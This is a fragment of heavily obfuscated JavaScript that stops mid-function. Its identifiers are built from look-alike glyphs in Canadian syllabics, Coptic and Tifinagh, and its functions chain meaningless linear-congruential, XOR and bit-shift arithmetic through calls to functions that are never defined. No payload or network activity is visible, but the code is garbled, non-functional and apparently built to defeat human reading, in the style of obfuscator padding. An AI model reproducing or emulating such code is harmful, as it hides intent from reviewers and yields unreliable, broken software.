		function ᐃᐃᐃⵠΔᐃⲆ(ΔΔⲆⲆᐃⲆᐃ, ᐃⲆΔΔⲆⲆⲆ, ⲆᐃᐃⵠⲆᐃⲆ, ⵠⵠΔΔΔᐃⵠ) {
			const ΔΔⵠⵠⵠᐃⵠ = (ΔΔⲆⲆᐃⲆᐃ + 34282) % 65336;
			const ⵠᐃᐃΔᐃⲆⵠ = ~(ᐃⲆΔΔⲆⲆⲆ & 45181) & 45181 | ~(45181 & ᐃⲆΔΔⲆⲆⲆ) & ᐃⲆΔΔⲆⲆⲆ;
			const ᐃᐃᐃᐃᐃⵠⲆ = (16 << (ⲆᐃᐃⵠⲆᐃⲆ >> 8 & 255)) + (32 << (ⲆᐃᐃⵠⲆᐃⲆ >> 24 & 255)) + (8 << (ⲆᐃᐃⵠⲆᐃⲆ >> 32 & 255)) + (24 << (ⲆᐃᐃⵠⲆᐃⲆ >> 16 & 255));
			const ᐃᐃΔᐃᐃⲆⵠ = ~(ⵠⵠΔΔΔᐃⵠ & 25475) & 25475 | ~(25475 & ⵠⵠΔΔΔᐃⵠ) & ⵠⵠΔΔΔᐃⵠ;
			const ΔΔⲆᐃⵠᐃⲆ = ᐃΔᐃΔᐃⲆᐃ(ΔΔⵠⵠⵠᐃⵠ, ⵠᐃᐃΔᐃⲆⵠ);
			const ⲆᐃⲆΔΔᐃⲆ = ᐃⲆⵠⲆⵠΔⵠ(ᐃᐃᐃᐃᐃⵠⲆ, ᐃᐃΔᐃᐃⲆⵠ, ΔΔⵠⵠⵠᐃⵠ, ⵠᐃᐃΔᐃⲆⵠ, ᐃᐃᐃᐃᐃⵠⲆ);
			const ΔⵠⲆⵠⵠⲆⲆⵠᐃ = ⲆⵠΔⲆΔⵠΔ(ᐃᐃΔᐃᐃⲆⵠ, ΔΔⵠⵠⵠᐃⵠ);
			const ᐃⲆⵠᐃⵠⲆⲆ = (58498 + (ΔΔⲆᐃⵠᐃⲆ ^ ⲆᐃⲆΔΔᐃⲆ)) % 65531;
			const Δᐃⵠⵠⵠᐃⵠ = ~(ᐃⲆⵠᐃⵠⲆⲆ & 37009) & 37009 | ~(37009 & ᐃⲆⵠᐃⵠⲆⲆ) & ᐃⲆⵠᐃⵠⲆⲆ;
			return Δᐃⵠⵠⵠᐃⵠ
		}

		function ᐃⵠⲆⵠⲆᐃⲆ(ᐃⲆⵠΔⵠΔⵠ, ᐃᐃⲆⲆᐃⲆΔ) {
			const ⲆⲆⲆΔⵠⲆᐃ = ((ᐃⲆⵠΔⵠΔⵠ + 49468) * 1103515245 + 12345) % 2147483648;
			const ΔᐃᐃⲆⵠᐃⵠ = ((ᐃᐃⲆⲆᐃⲆΔ + 30513) * 214013 + 2531011) % 4294967296;
			const ⲆΔΔΔΔΔⵠ = ⲆᐃⲆⵠⵠⲆΔ(ⲆⲆⲆΔⵠⲆᐃ, ΔᐃᐃⲆⵠᐃⵠ, ⲆⲆⲆΔⵠⲆᐃ);
			const ᐃⲆⵠΔⲆⵠⲆΔΔ = ⲆᐃⲆⵠΔⲆⲆ(ΔᐃᐃⲆⵠᐃⵠ, ⲆⲆⲆΔⵠⲆᐃ, ΔᐃᐃⲆⵠᐃⵠ, ⲆⲆⲆΔⵠⲆᐃ, ΔᐃᐃⲆⵠᐃⵠ);
			const ᐃⵠⵠΔⲆΔⲆⲆⵠ = ΔⲆΔᐃΔ(ⲆⲆⲆΔⵠⲆᐃ, ΔᐃᐃⲆⵠᐃⵠ, ⲆⲆⲆΔⵠⲆᐃ, ΔᐃᐃⲆⵠᐃⵠ);
			const ⲆⲆⲆⲆⵠΔᐃ = (17943 | ⲆΔΔΔΔΔⵠ) & ~(ⲆΔΔΔΔΔⵠ & 17943);
			const ΔᐃΔⵠΔΔᐃ = 21791 ^ ⲆⲆⲆⲆⵠΔᐃ;
			return ΔᐃΔⵠΔΔᐃ
		}
		const ᐃΔᐃΔⲆ = ⲆⵠΔΔᐃ;

		function ⲆⲆΔΔⲆᐃⵠ(ΔᐃΔΔⵠⵠᐃ, ΔⲆΔᐃⵠⵠᐃ) {
			const ΔⲆΔᐃᐃⵠⲆ = (2531011 + 214013 * (ΔᐃΔΔⵠⵠᐃ + 62874)) % 4294967296;
			const ΔΔΔⲆⲆΔᐃ = (24 << (ΔⲆΔᐃⵠⵠᐃ >> 24 & 255)) + (16 << (ΔⲆΔᐃⵠⵠᐃ >> 32 & 255)) + (8 << (ΔⲆΔᐃⵠⵠᐃ >> 8 & 255)) + (32 << (ΔⲆΔᐃⵠⵠᐃ >> 16 & 255));
			const ᐃⵠΔΔΔⵠᐃ = ΔⵠΔΔᐃΔⲆ(ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ, ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ, ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ);
			const ⲆᐃⵠᐃⵠᐃΔ = ΔⵠΔΔᐃΔⲆ(ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ, ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ, ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ);
			const ⲆⵠᐃⲆⵠᐃⵠᐃΔ = ΔⲆΔᐃΔ(ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ, ΔⲆΔᐃᐃⵠⲆ, ΔΔΔⲆⲆΔᐃ);
			const ᐃⲆᐃⲆⵠᐃᐃ = (16 << ((ᐃⵠΔΔΔⵠᐃ ^ ⲆᐃⵠᐃⵠᐃΔ) >> 32 & 255)) + (8 << ((ᐃⵠΔΔΔⵠᐃ ^ ⲆᐃⵠᐃⵠᐃΔ) >> 24 & ᐃᐃᐃⵠⵠ)) + (24 << ((ᐃⵠΔΔΔⵠᐃ ^ ⲆᐃⵠᐃⵠᐃΔ) >> 16 & 255)) + (32 << ((ᐃⵠΔΔΔⵠᐃ ^ ⲆᐃⵠᐃⵠᐃΔ) >> 8 & 255));
			const ᐃⲆⲆᐃΔΔΔ = ~(ᐃⲆᐃⲆⵠᐃᐃ & 55949) & 55949 | ~(55949 & ᐃⲆᐃⲆⵠᐃᐃ) & ᐃⲆᐃⲆⵠᐃᐃ;
			return ᐃⲆⲆᐃΔΔΔ
		}

		function ᐃᐃΔⵠⲆΔⲆ(ΔⵠᐃⵠΔᐃᐃ, ⵠⲆᐃᐃⵠΔΔ, ⲆᐃⲆⵠⲆ, ΔΔⵠⲆᐃⵠⲆ, ⲆⵠΔΔⲆΔⲆ, ⲆΔᐃⵠⲆⲆⵠ) {
			const ΔΔᐃΔΔⲆᐃ = (24 << (ΔⵠᐃⵠΔᐃᐃ >> 24 & 255)) + (32 << (ΔⵠᐃⵠΔᐃᐃ >> 16 & 255)) + (16 << (ΔⵠᐃⵠΔᐃᐃ >> 8 & 255)) + (ⵠⵠⲆⵠΔ << (ΔⵠᐃⵠΔᐃᐃ >> 32 & 255));
			const ᐃΔⲆⲆΔΔⵠ = (41551 | ⵠⲆᐃᐃⵠΔΔ) & ~(ⵠⲆᐃᐃⵠΔΔ & 41551);
			const ⵠⲆΔᐃⵠΔᐃ = (24 << (ⲆᐃⲆⵠⲆ >> 24 & 255)) + (16 << (ⲆᐃⲆⵠⲆ >> 32 & ᐃᐃⲆⵠⲆ)) + (Δᐃⵠⵠⵠ << (ⲆᐃⲆⵠⲆ >> ΔⵠΔᐃᐃ & ΔⵠᐃⵠΔ)) + (32 << (ⲆᐃⲆⵠⲆ >> 8 & 255));
			const ᐃΔⲆΔᐃᐃⵠ = ~(32641 & ΔΔⵠⲆᐃⵠⲆ) & (32641 | ΔΔⵠⲆᐃⵠⲆ);
			const ΔⲆΔⲆⵠᐃᐃ = (214013 * (ⲆⵠΔΔⲆΔⲆ + 35582) + 2531011) % 4294967296;
			const ΔΔᐃⲆΔΔⲆ = ~(1090 & ⲆΔᐃⵠⲆⲆⵠ) & (ⲆΔᐃⵠⲆⲆⵠ | 1090);
			const ⲆⵠᐃᐃⲆⲆⵠ = ᐃᐃᐃⲆᐃΔᐃ(ΔΔᐃΔΔⲆᐃ, ᐃΔⲆⲆΔΔⵠ, ⵠⲆΔᐃⵠΔᐃ, ᐃΔⲆΔᐃᐃⵠ, ΔⲆΔⲆⵠᐃᐃ, ΔΔᐃⲆΔΔⲆ);
			const ⵠΔⵠᐃⲆΔⲆΔΔ = ᐃΔΔⲆⵠᐃΔ(ΔΔᐃΔΔⲆᐃ, ᐃΔⲆⲆΔΔⵠ, ⵠⲆΔᐃⵠΔᐃ, ᐃΔⲆΔᐃᐃⵠ, ΔⲆΔⲆⵠᐃᐃ);
			const ᐃΔΔⵠⵠⲆᐃΔᐃ = ΔⲆΔᐃΔ(ΔΔᐃⲆΔΔⲆ, ΔΔᐃΔΔⲆᐃ, ᐃΔⲆⲆΔΔⵠ, ⵠⲆΔᐃⵠΔᐃ);
			const ΔΔⲆᐃⲆΔΔ = ~(ⲆⵠᐃᐃⲆⲆⵠ & 8077) & 8077 | ~(8077 & ⲆⵠᐃᐃⲆⲆⵠ) & ⲆⵠᐃᐃⲆⲆⵠ;
			const ⵠΔⵠⲆᐃᐃⲆ = ~(3708 & ΔΔⲆᐃⲆΔΔ) & (ΔΔⲆᐃⲆΔΔ | 3708);
			return ⵠΔⵠⲆᐃᐃⲆ
		}

		function ⲆΔΔⲆⵠᐃᐃ(ᐃᐃⲆⲆⲆⵠⲆ, ⵠᐃⲆᐃⵠⲆⵠ, ⵠΔⲆᐃΔⵠⲆ, ⲆΔΔⵠᐃⵠⲆ, ᐃᐃⲆⲆⵠⲆΔ) {
			const ⲆΔⵠᐃⵠⵠΔ = ((9716 + ᐃᐃⲆⲆⲆⵠⲆ) * 1664525 + 1013904223) % 4294967296;
			const ΔⵠⵠΔⵠΔⲆ = ~(ⵠᐃⲆᐃⵠⲆⵠ & 7703) & ⵠᐃⲆᐃⵠⲆⵠ | ~(ⵠᐃⲆᐃⵠⲆⵠ & 7703) & 7703;
			const ⲆⲆᐃⲆᐃⲆΔ = (ⵠΔⲆᐃΔⵠⲆ | 31275) & ~(31275 & ⵠΔⲆᐃΔⵠⲆ);
			const ΔΔᐃⵠΔⲆᐃ = ~(25693 & ⲆΔΔⵠᐃⵠⲆ) & 25693 | ~(25693 & ⲆΔΔⵠᐃⵠⲆ) & ⲆΔΔⵠᐃⵠⲆ;
			const ⲆⵠΔᐃΔΔⵠ = (8 << (ᐃᐃⲆⲆⵠⲆΔ >> 8 & 255)) + (32 << (ᐃᐃⲆⲆⵠⲆΔ >> 24 & 255)) + (24 << (ᐃᐃⲆⲆⵠⲆΔ >> 16 & 255)) + (16 << (ᐃᐃⲆⲆⵠⲆΔ >> 32 & 255));
			const ⲆⵠⲆΔⵠᐃᐃ = ΔⵠΔΔᐃΔⲆ(ⲆΔⵠᐃⵠⵠΔ, ΔⵠⵠΔⵠΔⲆ, ⲆⲆᐃⲆᐃⲆΔ, ΔΔᐃⵠΔⲆᐃ, ⲆⵠΔᐃΔΔⵠ, ⲆΔⵠᐃⵠⵠΔ);
			const ⵠⲆⵠᐃΔⲆⲆ = ΔⲆΔᐃΔ(ΔⵠⵠΔⵠΔⲆ, ⲆⲆᐃⲆᐃⲆΔ, ΔΔᐃⵠΔⲆᐃ, ⲆⵠΔᐃΔΔⵠ);
			const ⵠⲆΔⲆⵠⵠⵠᐃΔ = ᐃⲆⵠΔΔᐃΔ(ⲆΔⵠᐃⵠⵠΔ, ΔⵠⵠΔⵠΔⲆ, ⲆⲆᐃⲆᐃⲆΔ);
			const ⵠⵠᐃⵠⵠΔΔ = (24 << ((ⲆⵠⲆΔⵠᐃᐃ ^ ⵠⲆⵠᐃΔⲆⲆ) >> 16 & 255)) + (8 << ((ⲆⵠⲆΔⵠᐃᐃ ^ ⵠⲆⵠᐃΔⲆⲆ) >> 8 & 255)) + (32 << ((ⲆⵠⲆΔⵠᐃᐃ ^ ⵠⲆⵠᐃΔⲆⲆ) >> 24 & 255)) + (16 << ((ⲆⵠⲆΔⵠᐃᐃ ^ ⵠⲆⵠᐃΔⲆⲆ) >> 32 & 255));
			const ΔᐃᐃⲆⲆⵠᐃ = ⵠⵠᐃⵠⵠΔΔ ^ 31710;
			return ΔᐃᐃⲆⲆⵠᐃ
		}
		const ⵠᐃΔᐃᐃΔⲆ = ⲆᐃⵠᐃⲆⵠⲆ;

		function ᐃⵠᐃⲆΔᐃᐃ(ⵠⵠⲆΔⵠᐃⵠ, ⲆⵠᐃⲆᐃⲆᐃ, ΔΔΔⵠΔΔⵠ, ΔⵠΔΔΔⵠΔ, ⵠⲆⵠΔⵠⵠⵠ, ⵠᐃΔⵠΔᐃΔ) {
			const ᐃⵠΔⲆⵠⵠΔ = 30142 ^ ⵠⵠⲆΔⵠᐃⵠ;
			const ⲆΔΔⲆⲆᐃⵠ = (ⲆⵠᐃⲆᐃⲆᐃ + 63025) % 65493;
			const ⵠΔⵠⲆΔⲆⲆ = ΔΔΔⵠΔΔⵠ ^ 30777;
			const ⵠᐃΔⵠⲆᐃΔ = ((45939 + ΔⵠΔΔΔⵠΔ) * 22695477 + 1) % 4294967296;
			const ᐃᐃⲆⲆᐃᐃᐃ = (8 << (ⵠⲆⵠΔⵠⵠⵠ >> 16 & ᐃᐃⲆⵠⲆ)) + (32 << (ⵠⲆⵠΔⵠⵠⵠ >> 24 & 255)) + (24 << (ⵠⲆⵠΔⵠⵠⵠ >> 32 & ᐃᐃⲆⵠⲆ)) + (16 << (ⵠⲆⵠΔⵠⵠⵠ >> Δᐃⵠⵠⵠ & ΔⵠᐃⵠΔ));
			const ᐃΔᐃᐃΔⲆⲆ = (ⵠᐃΔⵠΔᐃΔ | 45652) & ~(ⵠᐃΔⵠΔᐃΔ & 45652);
			const ⵠᐃⵠⵠᐃⲆⲆ = ⲆΔΔⵠΔⵠΔ(ᐃⵠΔⲆⵠⵠΔ, ⲆΔΔⲆⲆᐃⵠ, ⵠΔⵠⲆΔⲆⲆ, ⵠᐃΔⵠⲆᐃΔ, ᐃᐃⲆⲆᐃᐃᐃ);
			const ⲆᐃΔΔⵠⲆΔᐃⵠ = ᐃⵠΔⲆᐃᐃⵠ(ᐃΔᐃᐃΔⲆⲆ, ᐃⵠΔⲆⵠⵠΔ, ⲆΔΔⲆⲆᐃⵠ, ⵠΔⵠⲆΔⲆⲆ, ⵠᐃΔⵠⲆᐃΔ);
			const ⲆⵠᐃᐃⲆⵠⲆΔΔ = ᐃᐃΔⵠⲆΔⲆ(ᐃᐃⲆⲆᐃᐃᐃ, ᐃΔᐃᐃΔⲆⲆ, ᐃⵠΔⲆⵠⵠΔ, ⲆΔΔⲆⲆᐃⵠ, ⵠΔⵠⲆΔⲆⲆ, ⵠᐃΔⵠⲆᐃΔ);
			const ⲆΔⲆⵠᐃⵠΔ = 46918 ^ ⵠᐃⵠⵠᐃⲆⲆ;
			const ⲆⲆⲆΔⵠⵠⵠ = ⲆΔⲆⵠᐃⵠΔ ^ 24022;
			return ⲆⲆⲆΔⵠⵠⵠ
		}

		function ΔⲆΔⲆⲆΔᐃ(ⵠΔⲆΔⲆᐃᐃ, ΔⵠΔᐃⲆΔⲆ, ⲆΔⵠΔᐃ, ΔⵠΔΔΔᐃᐃ, ⵠΔΔΔⵠⲆᐃ, ΔΔᐃⵠᐃᐃΔ) {
			const ΔⵠⵠⵠⵠⲆⵠ = (2531011 + 214013 * (ⵠΔⲆΔⲆᐃᐃ + 16955)) % 4294967296;
			const ⲆⵠΔᐃⵠΔΔ = (1103515245 * (9436 + ΔⵠΔᐃⲆΔⲆ) + 12345) % 2147483648;
			const ᐃⵠᐃᐃⵠⲆΔ = (14774 | ⲆΔⵠΔᐃ) & ~(14774 & ⲆΔⵠΔᐃ);
			const ΔⲆⲆⵠΔⲆⵠ = (48802 | ΔⵠΔΔΔᐃᐃ) & ~(ΔⵠΔΔΔᐃᐃ & 48802);
			const ⵠⵠⵠⲆΔᐃΔ = ~(ⵠΔΔΔⵠⲆᐃ & 24998) & (ⵠΔΔΔⵠⲆᐃ | 24998);
			const ⵠⵠΔΔᐃᐃΔ = (Δᐃⵠⵠⵠ << (ΔΔᐃⵠᐃᐃΔ >> 8 & 255)) + (16 << (ΔΔᐃⵠᐃᐃΔ >> 16 & 255)) + (32 << (ΔΔᐃⵠᐃᐃΔ >> 32 & 255)) + (24 << (ΔΔᐃⵠᐃᐃΔ >> 24 & 255));
			const ⵠΔᐃΔⵠΔⵠ = ᐃΔΔᐃΔⵠᐃ(ΔⵠⵠⵠⵠⲆⵠ, ⲆⵠΔᐃⵠΔΔ, ᐃⵠᐃᐃⵠⲆΔ, ΔⲆⲆⵠΔⲆⵠ);
			const ⲆⵠⵠⲆᐃⲆⲆ = ᐃⲆⵠⲆⵠΔⵠ(ⵠⵠⵠⲆΔᐃΔ, ⵠⵠΔΔᐃᐃΔ, ΔⵠⵠⵠⵠⲆⵠ, ⲆⵠΔᐃⵠΔΔ, ᐃⵠᐃᐃⵠⲆΔ);
			const ᐃⲆⲆⲆᐃⵠⲆ = ᐃΔΔᐃΔⵠᐃ(ΔⲆⲆⵠΔⲆⵠ, ⵠⵠⵠⲆΔᐃΔ, ⵠⵠΔΔᐃᐃΔ, ΔⵠⵠⵠⵠⲆⵠ);
			const ⲆⲆⵠΔⵠⵠᐃ = (24 << ((ⵠΔᐃΔⵠΔⵠ ^ ⲆⵠⵠⲆᐃⲆⲆ) >> 24 & 255)) + (8 << ((ⵠΔᐃΔⵠΔⵠ ^ ⲆⵠⵠⲆᐃⲆⲆ) >> 32 & 255)) + (16 << ((ⵠΔᐃΔⵠΔⵠ ^ ⲆⵠⵠⲆᐃⲆⲆ) >> ΔᐃΔⲆⲆ & 255)) + (32 << ((ⵠΔᐃΔⵠΔⵠ ^ ⲆⵠⵠⲆᐃⲆⲆ) >> 16 & 255));
			const ᐃⵠⲆⵠΔⲆⲆ = (214013 * ((ⲆⲆⵠΔⵠⵠᐃ ^ ᐃⲆⲆⲆᐃⵠⲆ) + 35404) + 2531011) % 4294967296;
			return ᐃⵠⲆⵠΔⲆⲆ
		}

		function ΔⲆΔᐃΔΔⵠ(ᐃΔΔⲆⲆ) {
			return ᐃΔⲆᐃΔᐃΔ(ᐃΔΔⲆⲆ, 8260, 46947, 8004, 37330, 5330)
		}
		const ΔⲆⲆΔΔ = ΔΔⲆΔᐃᐃᐃ;

		function ΔⲆᐃΔⵠⲆⵠ(ⲆⲆⲆᐃⵠΔᐃ, ΔᐃⵠᐃⲆᐃΔ, ᐃⲆⲆᐃⲆⵠΔ, ⲆⲆⵠΔΔⵠⲆ, ⵠⵠⵠⲆⵠⲆᐃ) {
			const ΔᐃⵠⲆᐃΔⲆ = 64570 ^ ⲆⲆⲆᐃⵠΔᐃ;
			const ⵠᐃⲆΔᐃⲆⵠ = (2531011 + (ΔᐃⵠᐃⲆᐃΔ + 41768) * 214013) % 4294967296;
			const ᐃⵠⵠⲆᐃⲆΔ = (1013904223 + 1664525 * (ᐃⲆⲆᐃⲆⵠΔ + 43923)) % 4294967296;
			const ΔΔᐃⵠᐃⵠⵠ = (16 << (ⲆⲆⵠΔΔⵠⲆ >> 32 & 255)) + (Δᐃⵠⵠⵠ << (ⲆⲆⵠΔΔⵠⲆ >> 24 & 255)) + (32 << (ⲆⲆⵠΔΔⵠⲆ >> ⵠᐃⵠⵠⲆ & 255)) + (24 << (ⲆⲆⵠΔΔⵠⲆ >> 8 & 255));
			const ⲆΔᐃⲆⵠⵠᐃ = (ⵠⵠⵠⲆⵠⲆᐃ | 21896) & ~(ⵠⵠⵠⲆⵠⲆᐃ & 21896);
			const ⵠⲆᐃⵠⲆⵠⲆ = ᐃⵠⲆⵠⲆᐃⲆ(ΔᐃⵠⲆᐃΔⲆ, ⵠᐃⲆΔᐃⲆⵠ);
			const ⲆⵠⵠⵠᐃⵠΔⵠᐃ = ⲆⲆⵠⵠⲆⲆᐃ(ᐃⵠⵠⲆᐃⲆΔ, ΔΔᐃⵠᐃⵠⵠ, ⲆΔᐃⲆⵠⵠᐃ, ΔᐃⵠⲆᐃΔⲆ);
			const ᐃᐃΔⲆⵠⲆΔ = ΔΔΔΔΔΔΔ(ⵠᐃⲆΔᐃⲆⵠ, ᐃⵠⵠⲆᐃⲆΔ, ΔΔᐃⵠᐃⵠⵠ, ⲆΔᐃⲆⵠⵠᐃ, ΔᐃⵠⲆᐃΔⲆ);
			const ⲆⵠΔΔΔⲆᐃ = ~(52206 & ⵠⲆᐃⵠⲆⵠⲆ) & (ⵠⲆᐃⵠⲆⵠⲆ | 52206);
			const ⵠⲆⵠᐃⲆᐃⵠ = (12345 + 1103515245 * (7491 + (ⲆⵠΔΔΔⲆᐃ ^ ᐃᐃΔⲆⵠⲆΔ))) % 2147483648;
			return ⵠⲆⵠᐃⲆᐃⵠ
		}
		const ⵠⵠΔᐃᐃ = ᐃΔᐃⲆΔ;

		function ⲆᐃⲆⵠΔⲆⲆ(ΔᐃᐃᐃⵠΔΔ, ⵠΔⵠΔᐃⵠᐃ, ΔⵠⲆⵠⵠᐃΔ, ΔᐃⵠΔⲆⵠⲆ, ⵠⵠΔᐃⲆΔᐃ) {
			const ⲆᐃᐃⵠΔΔΔ = (2147483587 + (ΔᐃᐃᐃⵠΔΔ + 64762) * 2147483629) % 2147483647;
			const ⵠⵠⵠⲆⵠᐃΔ = (214013 * (18197 + ⵠΔⵠΔᐃⵠᐃ) + 2531011) % 4294967296;
			const ᐃΔⵠⲆΔⲆᐃ = (2531011 + 214013 * (22845 + ΔⵠⲆⵠⵠᐃΔ)) % 4294967296;
			const ⵠⲆⵠΔⵠᐃᐃ = (32 << (ΔᐃⵠΔⲆⵠⲆ >> 16 & ΔⵠⲆⵠᐃ)) + (ΔΔᐃᐃΔ << (ΔᐃⵠΔⲆⵠⲆ >> 8 & 255)) + (8 << (ΔᐃⵠΔⲆⵠⲆ >> 32 & 255)) + (24 << (ΔᐃⵠΔⲆⵠⲆ >> 24 & 255));
			const ΔΔΔᐃⲆΔΔ = ~(ⵠⵠΔᐃⲆΔᐃ & 11999) & ⵠⵠΔᐃⲆΔᐃ | ~(ⵠⵠΔᐃⲆΔᐃ & 11999) & 11999;
			const ⲆᐃⵠⲆⲆⵠᐃ = ΔⵠΔΔᐃΔⲆ(ⲆᐃᐃⵠΔΔΔ, ⵠⵠⵠⲆⵠᐃΔ, ᐃΔⵠⲆΔⲆᐃ, ⵠⲆⵠΔⵠᐃᐃ, ΔΔΔᐃⲆΔΔ, ⲆᐃᐃⵠΔΔΔ);
			const ⲆΔⵠⵠᐃⲆⵠ = ᐃᐃΔⵠⲆΔⲆ(ⵠⵠⵠⲆⵠᐃΔ, ᐃΔⵠⲆΔⲆᐃ, ⵠⲆⵠΔⵠᐃᐃ, ΔΔΔᐃⲆΔΔ, ⲆᐃᐃⵠΔΔΔ, ⵠⵠⵠⲆⵠᐃΔ);
			const ⲆⵠⲆⵠΔⲆⲆⵠⵠ = ΔⲆΔᐃΔ(ᐃΔⵠⲆΔⲆᐃ, ⵠⲆⵠΔⵠᐃᐃ, ΔΔΔᐃⲆΔΔ, ⲆᐃᐃⵠΔΔΔ);
			const ⵠΔⲆΔⵠΔⲆ = (Δᐃⵠⵠⵠ << ((ⲆᐃⵠⲆⲆⵠᐃ ^ ⲆΔⵠⵠᐃⲆⵠ) >> 24 & 255)) + (16 << ((ⲆᐃⵠⲆⲆⵠᐃ ^ ⲆΔⵠⵠᐃⲆⵠ) >> ΔΔᐃᐃΔ & 255)) + (24 << ((ⲆᐃⵠⲆⲆⵠᐃ ^ ⲆΔⵠⵠᐃⲆⵠ) >> 8 & 255)) + (32 << ((ⲆᐃⵠⲆⲆⵠᐃ ^ ⲆΔⵠⵠᐃⲆⵠ) >> 32 & 255));
			const ΔⲆⵠⲆⵠⲆᐃ = ⵠΔⲆΔⵠΔⲆ ^ 35444;
			return ΔⲆⵠⲆⵠⲆᐃ
		}
		const ⵠⵠⵠⵠΔ = ⲆΔΔⵠⲆ;

		function ᐃᐃⵠΔΔᐃΔ(ⵠⵠⵠⵠᐃⲆⵠ, ⵠⲆⵠⵠⲆⵠΔ, ⵠᐃⲆⲆⲆⵠᐃ, ⵠΔΔᐃΔⵠⵠ) {
			const ⵠᐃⲆⵠⵠⲆᐃ = (2147483587 + (37418 + ⵠⵠⵠⵠᐃⲆⵠ) * 2147483629) % 2147483647;
			const ⲆΔᐃΔⲆΔⲆ = ⵠⲆⵠⵠⲆⵠΔ ^ 57623;
			const ⲆⲆΔⵠⵠⵠΔ = ~(ⵠᐃⲆⲆⲆⵠᐃ & 40280) & ⵠᐃⲆⲆⲆⵠᐃ | ~(ⵠᐃⲆⲆⲆⵠᐃ & 40280) & 40280;
			const ⵠᐃⲆᐃΔⵠΔ = ~(ⵠΔΔᐃΔⵠⵠ & 24601) & ⵠΔΔᐃΔⵠⵠ | ~(ⵠΔΔᐃΔⵠⵠ & 24601) & 24601;
			const ⵠⵠᐃᐃⵠⲆᐃ = ⲆᐃⲆΔᐃᐃᐃ(ⵠᐃⲆⵠⵠⲆᐃ, ⲆΔᐃΔⲆΔⲆ);
			const ⵠⲆⲆᐃΔᐃᐃΔⵠ = ⲆᐃⲆΔᐃᐃᐃ(ⲆⲆΔⵠⵠⵠΔ, ⵠᐃⲆᐃΔⵠΔ);
			const ⵠⲆⵠᐃⵠⵠΔᐃᐃ = ⵠⲆᐃⲆⲆΔΔ(ⵠᐃⲆⵠⵠⲆᐃ, ⲆΔᐃΔⲆΔⲆ, ⲆⲆΔⵠⵠⵠΔ, ⵠᐃⲆᐃΔⵠΔ, ⵠᐃⲆⵠⵠⲆᐃ);
			const ΔⲆᐃⵠᐃⵠⵠ = ~(43902 & ⵠⵠᐃᐃⵠⲆᐃ) & 43902 | ~(43902 & ⵠⵠᐃᐃⵠⲆᐃ) & ⵠⵠᐃᐃⵠⲆᐃ;
			const ΔⵠΔᐃⵠⲆⵠ = (8862 | ΔⲆᐃⵠᐃⵠⵠ) & ~(8862 & ΔⲆᐃⵠᐃⵠⵠ);
			return ΔⵠΔᐃⵠⲆⵠ
		}

		function ⵠⵠΔⲆᐃΔⵠ(ⲆᐃⲆⲆᐃΔᐃ, ΔⲆᐃⲆΔ, ⲆⲆⲆⵠⲆᐃⵠ) {
			const ⲆᐃᐃⲆⲆⵠⵠ = (12345 + 1103515245 * (39051 + ⲆᐃⲆⲆᐃΔᐃ)) % 2147483648;
			const ᐃᐃᐃⲆᐃᐃⲆ = (44117 | ΔⲆᐃⲆΔ) & ~(ΔⲆᐃⲆΔ & 44117);
			const ΔⲆⲆΔΔⲆᐃ = (24 << (ⲆⲆⲆⵠⲆᐃⵠ >> 24 & 255)) + (8 << (ⲆⲆⲆⵠⲆᐃⵠ >> 16 & 255)) + (16 << (ⲆⲆⲆⵠⲆᐃⵠ >> 32 & ΔⵠᐃⵠΔ)) + (32 << (ⲆⲆⲆⵠⲆᐃⵠ >> 8 & ᐃᐃⲆⵠⲆ));
			const ΔⵠᐃΔⵠᐃΔ = ⲆΔΔⲆⵠᐃᐃ(ⲆᐃᐃⲆⲆⵠⵠ, ᐃᐃᐃⲆᐃᐃⲆ, ΔⲆⲆΔΔⲆᐃ, ⲆᐃᐃⲆⲆⵠⵠ, ᐃᐃᐃⲆᐃᐃⲆ);
			const ⲆⲆᐃᐃΔᐃᐃ = ᐃᐃᐃⲆᐃΔᐃ(ΔⲆⲆΔΔⲆᐃ, ⲆᐃᐃⲆⲆⵠⵠ, ᐃᐃᐃⲆᐃᐃⲆ, ΔⲆⲆΔΔⲆᐃ, ⲆᐃᐃⲆⲆⵠⵠ, ᐃᐃᐃⲆᐃᐃⲆ);
			const ⵠⲆⲆᐃΔⵠΔ = ΔⵠΔᐃΔⵠᐃ(ΔⲆⲆΔΔⲆᐃ, ⲆᐃᐃⲆⲆⵠⵠ);
			const ⲆⲆᐃΔⲆΔⵠ = (16 << ((ΔⵠᐃΔⵠᐃΔ ^ ⲆⲆᐃᐃΔᐃᐃ) >> 32 & ᐃᐃᐃⵠⵠ)) + (24 << ((ΔⵠᐃΔⵠᐃΔ ^ ⲆⲆᐃᐃΔᐃᐃ) >> 24 & ᐃᐃⲆⵠⲆ)) + (32 << ((ΔⵠᐃΔⵠᐃΔ ^ ⲆⲆᐃᐃΔᐃᐃ) >> 8 & 255)) + (8 << ((ΔⵠᐃΔⵠᐃΔ ^ ⲆⲆᐃᐃΔᐃᐃ) >> 16 & 255));
			const ᐃΔⲆⲆⵠᐃⵠ = (ⵠⵠⲆⵠΔ << ((ⲆⲆᐃΔⲆΔⵠ ^ ⵠⲆⲆᐃΔⵠΔ) >> 32 & ΔⵠⲆⵠᐃ)) + (ⲆⲆⲆΔΔ << ((ⲆⲆᐃΔⲆΔⵠ ^ ⵠⲆⲆᐃΔⵠΔ) >> 8 & 255)) + (32 << ((ⲆⲆᐃΔⲆΔⵠ ^ ⵠⲆⲆᐃΔⵠΔ) >> 16 & 255)) + (24 << ((ⲆⲆᐃΔⲆΔⵠ ^ ⵠⲆⲆᐃΔⵠΔ) >> 24 & 255));
			return ᐃΔⲆⲆⵠᐃⵠ
		}

		function ΔᐃⵠᐃΔΔᐃ(ⵠⲆⵠΔⲆ, ⲆᐃⲆᐃᐃⲆᐃ, ⵠⲆⵠⲆⵠΔⵠ, ᐃᐃⲆⵠⵠⵠⲆ) {
